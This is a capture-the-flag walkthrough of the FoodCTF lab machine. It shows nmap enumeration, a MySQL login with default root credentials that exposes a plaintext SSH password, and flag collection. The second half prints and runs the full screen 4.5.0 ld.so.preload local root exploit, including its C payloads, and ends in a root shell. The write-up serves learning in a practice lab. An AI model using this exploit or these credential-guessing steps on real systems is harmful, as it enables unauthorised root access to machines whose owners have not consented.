FIrst lets edit the /etc/hosts file.
127.0.0.1       kubernetes.docker.internal
10.10.179.166  food.thm


This is room for one of the King of the Hill machines, FoodCTF. Capture the food and all the flags, while you're at it.

You can access the official writeup by clicking Options (top right) and then 'Writeups'.

This box was from the April 2020 KoTH rotation. It awards no points, as the current question system doesn't allow me to do this.

We have 8 flags to collect.

Lets do this.


Nmap scan results:

root@LAPTOP-U5913CMD:/home/akshay/Desktop/FoodCTF# nmap -A -T4 food.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-19 18:18 IST
Stats: 0:00:07 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 18:20 (0:00:34 remaining)
Nmap scan report for food.thm (10.10.179.166)
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 28:0c:0c:d9:5a:7d:be:e6:f4:3c:ed:10:51:49:4d:19 (RSA)
|   256 17:ce:03:3b:bb:20:78:09:ab:76:c0:6d:8d:c4:df:51 (ECDSA)
|_  256 07:8a:50:b5:5b:4a:a7:6c:c8:b3:a1:ca:77:b9:0d:07 (ED25519)
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: DontAllowDatabaseTableColumn, ODBCClient, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, LongPassword, IgnoreSigpipes, SupportsCompression, LongColumnFlag, SupportsLoadDataLocal, Speaks41ProtocolNew, InteractiveClient, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, FoundRows, SwitchToSSLAfterHandshake, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: SYt\x16;6dFo\x0C\x07\x1CN\x1A5\x10\x1B\x7FfL
|_  Auth Plugin Name: mysql_native_password
9999/tcp open  abyss?
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Thu, 19 Nov 2020 12:48:51 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|     king
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Date: Thu, 19 Nov 2020 12:48:50 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|_    king

So as I was enumerating through the nmap scan results.
I found out about the mysql running and tried to login using default credentials.
Fortunately I was able to login using root:root

root@LAPTOP-U5913CMD:/home/akshay# mysql -u root -h food.thm -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
ERROR 1046 (3D000): No database selected
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.14 sec)

mysql> use users;
sReading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| User            |
+-----------------+
1 row in set (0.18 sec)

mysql> select * from User;
+----------+---------------------------------------+
| username | password                              |
+----------+---------------------------------------+
| ramen    | noodlesRTheBest                       |
| flag     | thm{2f30841ff8d9646845295135adda8332} |
+----------+---------------------------------------+
2 rows in set (0.13 sec)

Flag 1 - thm{2f30841ff8d9646845295135adda8332}


We got username and password.
Lets go for ssh

ramen:noodlesRTheBest

root@LAPTOP-U5913CMD:/home/akshay# ssh ramen@food.thm
The authenticity of host 'food.thm (10.10.179.166)' can't be established.
ECDSA key fingerprint is SHA256:N7ASA0s9oqLPm9OT5QAEpcMYTqs2b3BFgpftASit74s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'food.thm,10.10.179.166' (ECDSA) to the list of known hosts.
ramen@food.thm's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Nov 19 13:00:07 UTC 2020

  System load:  0.08              Processes:           91
  Usage of /:   43.7% of 9.78GB   Users logged in:     0
  Memory usage: 66%               IP address for eth0: 10.10.179.166
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Sat Mar 21 00:20:20 2020
ramen@foodctf:~$ id
uid=1003(ramen) gid=1003(ramen) groups=1003(ramen)

ramen@foodctf:/var$ ls -la
total 56
drwxr-xr-x 13 root root   4096 Mar 28  2020 .
drwxr-xr-x 24 root root   4096 Mar 19  2020 ..
drwxr-xr-x  2 root root   4096 Mar 20  2020 backups
drwxr-xr-x 10 root root   4096 Mar 19  2020 cache
drwxrwxrwt  2 root root   4096 Aug  5  2019 crash
-rw-r--r--  1 root root     38 Mar 28  2020 flag.txt
drwxr-xr-x 41 root root   4096 Mar 20  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Aug  5  2019 lock -> /run/lock
drwxrwxr-x 10 root syslog 4096 Mar 30  2020 log
drwxrwsr-x  2 root mail   4096 Aug  5  2019 mail
drwxr-xr-x  2 root root   4096 Aug  5  2019 opt
lrwxrwxrwx  1 root root      4 Aug  5  2019 run -> /run
drwxr-xr-x  3 root root   4096 Mar 19  2020 snap
drwxr-xr-x  4 root root   4096 Aug  5  2019 spool
drwxrwxrwt  4 root root   4096 Nov 19 12:45 tmp
ramen@foodctf:/var$ cat flag.txt
thm{0c48608136e6f8c86aecdb5d4c3d7ba8}


Flag 2 - thm{0c48608136e6f8c86aecdb5d4c3d7ba8}



ramen@foodctf:/tmp$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
ramen@foodctf:/tmp$



ramen@foodctf:/home/food$ ls -la
total 40
drwxr-xr-x 5 food food 4096 Mar 30  2020 .
drwxr-xr-x 7 root root 4096 Mar 28  2020 ..
-rw-r--r-- 1 food food  220 Mar 19  2020 .bash_logout
-rw-r--r-- 1 food food 3771 Mar 19  2020 .bashrc
drwx------ 2 food food 4096 Mar 19  2020 .cache
-rw-rw-r-- 1 food food   38 Mar 28  2020 .flag
drwx------ 3 food food 4096 Mar 19  2020 .gnupg
drwxrwxr-x 3 food food 4096 Mar 19  2020 .local
-rw------- 1 food food   23 Mar 19  2020 .mysql_history
-rw-r--r-- 1 food food  815 Mar 28  2020 .profile
ramen@foodctf:/home/food$ cat .flag
thm{58a3cb46855af54d0660b34fd20a04c1}


Flag 3- thm{58a3cb46855af54d0660b34fd20a04c1}


ramen@foodctf:/home/bread$ ls -la
total 7900
drwxr-xr-x 6 bread bread    4096 Apr  6  2020 .
drwxr-xr-x 7 root  root     4096 Mar 28  2020 ..
-rw------- 1 bread bread       5 Apr  6  2020 .bash_history
-rw-r--r-- 1 bread bread     220 Mar 20  2020 .bash_logout
-rw-r--r-- 1 bread bread    3771 Mar 20  2020 .bashrc
drwx------ 2 bread bread    4096 Mar 20  2020 .cache
----r--r-- 1 bread bread      38 Mar 28  2020 flag
drwx------ 3 bread bread    4096 Mar 20  2020 .gnupg
drwxrwxr-x 3 bread bread    4096 Mar 20  2020 .local
-rwxrwxr-x 1 bread bread 8037916 Apr  6  2020 main
-rw-rw-r-- 1 bread bread    1513 Apr  6  2020 main.go
-rw-r--r-- 1 bread bread     825 Mar 28  2020 .profile
drwxrwxr-x 3 bread bread    4096 Apr  6  2020 resources
ramen@foodctf:/home/bread$ cat flag
thm{7baf5aa8491a4b7b1c2d231a24aec575}


Flag 4 - thm{7baf5aa8491a4b7b1c2d231a24aec575}



ramen@foodctf:~$ find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/vim.basic                                                                                                      
/usr/bin/passwd                                                                                                         
/usr/bin/traceroute6.iputils                                                                                            
/usr/bin/gpasswd                                                                                                        
/usr/bin/sudo                                                                                                           
/usr/bin/newgrp                                                                                                         
/usr/bin/newgidmap                                                                                                      
/usr/bin/screen-4.5.0


screen-4.5.0 has a exploit which can help us escalate our privileges to root.

THe exploit goes like this:

#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...


ramen@foodctf:/tmp$ cat libhax.c

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
ramen@foodctf:/tmp$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:8:5: warning: implicit declaration of function ‘chmod’; did you mean ‘chroot’? [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^~~~~
     chroot


ramen@foodctf:/tmp$ cat rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
ramen@foodctf:/tmp$ gcc -o /tmp/rootshell /tmp/rootshell.c
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
     setbuf
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
     setbuf
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
     seteuid(0);
     ^~~~~~~
     setbuf
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);


ramen@foodctf:/tmp$ cd /etc
ramen@foodctf:/etc$ umask 000
ramen@foodctf:/etc$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"


ramen@foodctf:/etc$ cd /tmp
ramen@foodctf:/tmp$ ls -la rootshell
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
-rwsr-xr-x 1 root root 8488 Nov 19 13:12 rootshell
ramen@foodctf:/tmp$ ./rootshell
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
# id
uid=0(root) gid=0(root) groups=0(root),1003(ramen)
#


# cd /root
# ls -la
total 7260
drwx------  4 root root    4096 Mar 30  2020 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
-rw-r--r--  1 root root    3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-rw-r--r--  1 root root      10 Nov 19 13:14 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Mar 19  2020 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
# cat flag
thm{9f1ee18d3021d135b03b943cc58f34db}



Flag 5 - thm{9f1ee18d3021d135b03b943cc58f34db}



# cd tryhackme
# ls -la
total 7644
drwxr-xr-x 5 tryhackme tryhackme    4096 Apr  6  2020 .
drwxr-xr-x 7 root      root         4096 Mar 28  2020 ..
-rw-r--r-- 1 tryhackme tryhackme     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tryhackme tryhackme    3771 Apr  4  2018 .bashrc
drwx------ 2 tryhackme tryhackme    4096 Mar 19  2020 .cache
-rw-rw---- 1 tryhackme tryhackme      38 Mar 27  2020 flag7
drwx------ 3 tryhackme tryhackme    4096 Mar 19  2020 .gnupg
-rwxrwxr-x 1 tryhackme tryhackme 7390798 Mar 20  2020 img
-rw-rw---- 1 tryhackme tryhackme  381312 Apr  6  2020 img.jpg
drwxrwxr-x 3 tryhackme tryhackme    4096 Mar 20  2020 .local
-rw------- 1 tryhackme tryhackme     590 Mar 20  2020 .mysql_history
-rw-r--r-- 1 tryhackme tryhackme     825 Mar 28  2020 .profile
-rw-r--r-- 1 tryhackme tryhackme       0 Mar 19  2020 .sudo_as_admin_successful
-rw------- 1 root      root          582 Mar 20  2020 .viminfo
-rw-rw-r-- 1 tryhackme tryhackme     173 Mar 20  2020 .wget-hsts
# cat flag7
thm{5a926ab5d3561e976f4ae5a7e2d034fe}


Flag 7 - thm{5a926ab5d3561e976f4ae5a7e2d034fe}


These all were the flags I was able to get.
Great machine.

Thank you.. Happy Hacking :)